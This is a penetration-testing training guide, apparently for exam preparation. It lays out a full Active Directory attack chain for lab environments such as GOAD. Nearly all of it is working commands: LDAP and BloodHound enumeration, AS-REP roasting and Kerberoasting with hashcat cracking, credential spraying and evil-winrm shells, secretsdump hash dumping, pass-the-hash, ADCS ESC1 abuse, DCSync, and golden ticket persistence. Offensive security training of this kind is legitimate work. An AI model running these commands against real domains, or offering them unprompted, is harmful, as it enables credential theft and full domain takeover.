# Integration: Full AD Attack Chain

Combine everything into one end-to-end exercise. Do this on GOAD or VulnLab before the exam.

## The Chain

```
Initial Creds → Enumerate → Find Weakness → Escalate → DA → Persist
```

## Phase 1: Enumerate Everything

```bash
# BloodHound — full picture
bloodhound-python -u user -p pass -d domain.local -c All -ns DC_IP

# LDAP users — check description fields for passwords
ldapsearch -x -H ldap://DC_IP -b "dc=domain,dc=local" \
  -D "user@domain.local" -w pass "(objectClass=user)" sAMAccountName description

# NetExec — verify access scope
nxc smb DC_IP -u user -p pass --users
nxc smb DC_IP -u user -p pass --pass-pol
```

**Deliverable:** Identify 2–3 attack paths in BloodHound before proceeding.

## Phase 2: Exploit Low-Hanging Fruit

```bash
# AS-REP Roast (no special rights needed)
GetNPUsers.py domain.local/user:pass -dc-ip DC_IP -request -format hashcat -outputfile asrep.txt

# Kerberoast (any domain user)
GetUserSPNs.py domain.local/user:pass -dc-ip DC_IP -request -outputfile kerb.txt

# Crack both
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
```

## Phase 3: Lateral Movement

```bash
# Test cracked creds across all machines
nxc smb 192.168.1.0/24 -u cracked_user -p 'CrackedPass'

# Get shell on accessible machine
evil-winrm -i TARGET_IP -u cracked_user -p 'CrackedPass'

# Re-enumerate from new position
bloodhound-python -u cracked_user -p 'CrackedPass' -d domain.local -c All -ns DC_IP
```

## Phase 4: Escalate to Domain Admin

Choose your path based on BloodHound output:
```bash
# Path A: PtH with high-priv hash found locally
secretsdump.py domain.local/cracked_user:pass@MACHINE_IP
nxc smb DC_IP -u administrator -H :FOUND_HASH

# Path B: ADCS ESC1
certipy find -u cracked_user@domain.local -p pass -dc-ip DC_IP -stdout
certipy req -u cracked_user@domain.local -p pass -ca "CA" -template "VulnTemplate" -upn administrator@domain.local

# Path C: DCSync (if already DA)
secretsdump.py domain.local/admin:pass@DC_IP
```

## Phase 5: Persistence (Lab Only)

```bash
# Dump krbtgt for golden ticket
secretsdump.py domain.local/admin:pass@DC_IP -just-dc-user krbtgt

# Create golden ticket
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-XXX -domain domain.local GoldUser
```

## Document as Attack Narrative

Write each step as:
- **Position:** where you are
- **Action:** exact command run
- **Result:** what you got
- **Next step:** why you chose it

**Time goal:** Complete the full chain in under 4 hours on GOAD. If it takes longer, identify which phase slowed you down and drill that specific technique.
